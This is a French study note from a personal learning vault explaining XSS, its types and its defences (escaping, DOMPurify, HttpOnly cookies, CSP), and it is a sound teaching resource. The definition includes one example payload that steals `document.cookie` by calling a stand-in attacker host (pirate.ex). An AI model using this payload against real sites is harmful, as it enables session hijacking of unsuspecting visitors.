---
type: concept
domain: securite
module: "[[Module 10 - Authentification et sécurité]]"
status: a-decouvrir
level: intermediaire
prerequisites:
  - "[[DOM]]"
  - "[[HTML]]"
parents:
  - "[[Authentification]]"
related:
  - "[[Session et cookie]]"
  - "[[CSRF]]"
next_review: 
method: []
tags:
  - concept
  - securite
---
# XSS

> [!info] En une phrase
> Le XSS (cross-site scripting) arrive quand une page affiche comme du HTML un texte fourni par un utilisateur : un script malveillant s'exécute alors chez les autres visiteurs.

```dataviewjs
await dv.view("10 — Templates/Scripts/learning", { view: "concept" })
```

## 1 · Comprendre
### Définition
Un utilisateur nomme sa tâche `<img src=x onerror="fetch('https://pirate.ex/?c='+document.cookie)">`. Si la page l'insère avec `innerHTML`, le code s'exécute **dans le navigateur de chaque personne** qui voit la liste, avec ses droits.
Types : **stocké** (en base, le plus grave), **réfléchi** (dans l'URL), **DOM** (le JS de la page insère un paramètre).
Protections :
- **Échapper** à l'affichage : `textContent` au lieu de `innerHTML` ; React, Vue et Angular échappent par défaut.
- Se méfier de `dangerouslySetInnerHTML` (React), `v-html` (Vue), `[innerHTML]` (Angular) ; si nécessaire, nettoyer avec **DOMPurify**.
- Cookies `HttpOnly` (le script ne peut pas les lire).
- En-tête **Content-Security-Policy** qui interdit les scripts non prévus.

### Pourquoi ça existe
Les pages affichent constamment du contenu venant des utilisateurs (noms, commentaires, labels).

### Le problème résolu
Empêcher qu'un utilisateur exécute du code chez les autres et vole leurs sessions.

## 2 · Explorer
### Comment ça fonctionne
```mermaid
flowchart TD
A[Attaquant] -->|script dans texte| B[Base]
  B --> P[Page]
  P -->|innerHTML| V[Victime exécute]
```

### Exemple concret
```js
// vulnérable
li.innerHTML = tache.nom;
// sûr
li.textContent = tache.nom;
```
```jsx
// React : sûr par défaut
<li>{tache.nom}</li>
```

### Cas d'utilisation
- Tout affichage de contenu saisi
- Revue de code front
- Configuration des en-têtes de sécurité du reverse proxy

> [!warning] À ne pas confondre
> Le **XSS** (script injecté dans la page, exécuté par le navigateur) n'est pas l'[[Injection SQL]] (code injecté dans la requête, exécuté par la base). Même idée : une donnée devenue code.

## 3 · Pratiquer

### Exercice visuel

Sur Excalidraw, **sans regarder la fiche**. Puis je compare avec la fiche, je corrige en rouge ce qui était faux, et j'explique mon dessin avec mes mots (section 4).

> [!example] 🛣️ Suis le trajet
> Dessine une dépense dont le libellé est `<script>…</script>`, enregistrée puis affichée. Montre où le script s'exécute et chez qui.

> [!example] 🔍 Trouve l'erreur
> Ce schéma est faux. Corrige-le en rouge et explique l'erreur.
>
> ```mermaid
> flowchart TD
>   L[Libellé piégé] --> V[v-html]
>   V --> S[Affichage sûr]
> ```

### Mon schéma

> [!tip] Mon dessin Excalidraw
> _Je crée le dessin « Schéma - XSS » et je l'intègre ici avec `![[Schéma - XSS.excalidraw]]`._

### Appliquer dans le fil rouge
- Pas encore d'étape du fil rouge pour cette notion : je l'applique dans mon travail (CVAT, Nuclio) ou je demande une étape à Claude.

## 4 · Expliquer
> [!quote] Mon résumé, avec mes mots
> _J'explique mon schéma avec mes mots, sans regarder la fiche. Si je bloque, je ne l'ai pas encore compris._

## 5 · Relier
- **Prérequis** : [[DOM]] · [[HTML]]
- **Complémentaires** : [[Session et cookie]] · [[CSRF]]

## 6 · Réviser
> [!question] Me faire interroger
> Je demande à Claude de m'interroger sur cette notion pour vérifier que je l'ai comprise.

### Validation de la maîtrise
La notion est maîtrisée quand je sais :
1. **l'expliquer** de façon fluide, à partir de mon schéma (section 4) ;
2. **l'adapter** à un autre contexte (consigne « Change de contexte », ou Claude m'interroge sur un autre cas) ;
3. **l'appliquer** pour de vrai dans le fil rouge (section 3).

Réussir un exercice ne suffit pas. C'est moi qui passe le statut en `maitrise`.

```dataviewjs
await dv.view("10 — Templates/Scripts/learning", { view: "maitrise" })
```
